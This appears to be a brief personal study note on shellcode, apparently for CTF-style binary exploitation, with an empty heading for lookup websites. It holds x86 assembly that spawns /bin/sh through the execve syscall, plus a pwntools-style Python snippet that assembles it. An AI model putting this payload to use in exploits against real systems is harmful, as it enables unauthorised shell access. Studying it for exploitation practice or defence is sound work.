# note

## 查询网站



## shellcode

### execve sh

asm

```asm
push 6845231
push 1852400175
xor edx, edx
xor ecx, ecx
mov ebx, esp
mov eax, 0xb
int 0x80
```

python

```python
asm_code = '''
    push 6845231    /* 682f736800 */
    push 1852400175
    xor edx, edx
    xor ecx, ecx
    mov ebx, esp
    mov eax, 0xb
    int 0x80
'''
shellcode = asm(asm_code)
```

